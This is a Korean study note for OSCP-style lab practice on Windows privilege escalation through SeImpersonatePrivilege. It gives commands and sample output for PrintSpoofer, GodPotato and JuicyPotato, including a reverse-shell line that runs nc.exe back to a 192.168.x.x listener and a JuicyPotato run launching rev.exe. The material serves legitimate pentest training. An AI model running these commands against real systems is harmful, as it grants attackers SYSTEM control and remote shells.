# SeImpersonatePrivilege — 실습

- 뜻: 가장(Impersonation)
- 핵심: 서비스 계정(Network Service, Local Service, IIS AppPool, MSSQL)으로 들어왔을 때 SYSTEM으로 올라가는 열쇠. Potato 계열의 원리.

# 1. 특권 상태 확인

- `whoami /priv | findstr /i "SeImpersonate"`

```text
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

- 현재 계정이 서비스 계정인지 확인
  - `whoami` → `nt authority\network service` 등이면 공격 대상

```text
nt authority\network service
```

# 2. 원리 이해 (3줄)

- Windows에서 서버(서비스)에 접속한 클라이언트의 토큰을 서버가 빌려쓸 수 있다
- 공격자가 가짜 클라이언트가 되어 SYSTEM 토큰을 발급받도록 유도한다
- 그 토큰으로 프로세스를 실행하면 SYSTEM 쉘이 된다

# 3. 실습: PrintSpoofer (구 서버, 2012~2019)

- 다운로드 후 실행
  - `PrintSpoofer64.exe -i -c "whoami"`

```text
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
nt authority\system
```

- 성공 시 출력: `nt authority\system`
- 실전 리버스쉘
  - `PrintSpoofer64.exe -i -c "C:\temp\nc.exe 192.168.x.x 4444 -e cmd"`

# 4. 실습: GodPotato / SweetPotato (신 서버, 2012~2022)

- .NET 4 필요, PrintSpoofer 막힌 환경용
  - `GodPotato-NET4.exe -cmd "cmd /c whoami"`

```text
[*] CombaseModule: 0x140000000
[*] Start DCOM connection
[*] CreateProcessAsUser() OK
nt authority\system
```

- Named Pipe 기반이라 방화벽/포트 영향이 적다

# 5. 실습: JuicyPotato (구 서버, CLSID 필요)

- CLSID 목록에서 OS 버전에 맞는 것 선택
  - `JuicyPotato.exe -l 1337 -p C:\temp\rev.exe -t * -c "{CLSID}"`

```text
Testing {CLSID} 1337
....
[+] authresult 0
[+] CreateProcessAsUser() OK
```

- 리스닝 포트(`-l`)와 실행 파일(`-p`) 지정이 핵심

# 6. 이해 포인트

- SeImpersonate는 권한 상승의 지름길이라 OSCP/PG에서 가장 자주 나온다
- 도구가 실패하면? → OS 버전/빌드에 맞는 도구로 교체 (PrintSpoofer → GodPotato → SweetPotato 순으로 시도)
- Disabled여도 도구가 알아서 켜므로 목록에만 보이면 시도한다
